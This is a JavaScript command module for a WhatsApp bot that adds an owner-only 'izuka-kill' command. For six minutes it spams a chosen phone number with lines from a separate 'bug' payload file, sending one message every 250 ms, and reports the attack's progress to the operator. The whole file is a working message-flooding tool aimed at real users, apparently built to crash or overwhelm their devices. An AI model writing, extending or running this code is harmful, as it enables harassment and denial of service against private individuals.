const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka3.js'); // ✅ Chimen fichye payload la

cmd({
  pattern: 'izuka-kill',
  desc: 'Owner only command to spam a target number with bug payload',
  category: 'bug',
  react: '🪲',
  filename: __filename
}, async (izuka, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'izuka-kill') return;

    const botNumber = await izuka.decodeJid(izuka.user.id);
    const senderId = m.sender;
    const allowed = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
    ];

    if (!allowed.includes(senderId)) {
      return await izuka.sendMessage(from, {
        text: '🚫 *THIS IS AN OWNER/SUDO ONLY COMMAND*'
      }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await izuka.sendMessage(from, {
        text: `❌ *Usage:* \`${prefix}izuka-kill 1305896xxxxxx\``
      }, { quoted: mek });
    }

    const safeNumbers = ['13058962443', config.OWNER_NUMBER, ...(config.SUDO || [])].map(n => n.toString().replace(/[^0-9]/g, ''));
    if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
      return await izuka.sendMessage(from, {
        text: '⚠️ *You cannot target this protected number.*'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const attackLines = bugchat.split('\n').filter(Boolean);

    await izuka.sendMessage(from, {
      text: `🧠 *IZUKA-KILL ACTIVATED*\n\n👾 Targeting: *+${targetNumber}*\n🔋 Payload Size: *${attackLines.length} lines*\n🕕 Duration: *6 minutes*\n\n🚀 Starting Attack...`
    }, { quoted: mek });

    const startTime = Date.now();
    let count = 0;

    while (Date.now() - startTime < 6 * 60 * 1000) { // 6 minutes
      for (let line of attackLines) {
        await izuka.sendMessage(targetJid, {
          text: `💥 *IZUKA PAYLOAD*\n${line}\n\n🔁 _DAWENS ENGINE_`
        }).catch(err => console.error(`❌ Fail to send:`, err));
        count++;
        await new Promise(r => setTimeout(r, 250)); // 250ms delay between each message
      }
    }

    await izuka.sendMessage(from, {
      text: `✅ *ATTACK COMPLETE*\n\n📌 Duration: 6 minutes\n📤 Total Sent: ${count} messages to +${targetNumber}`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error:\n${error.message}`);
  }
});
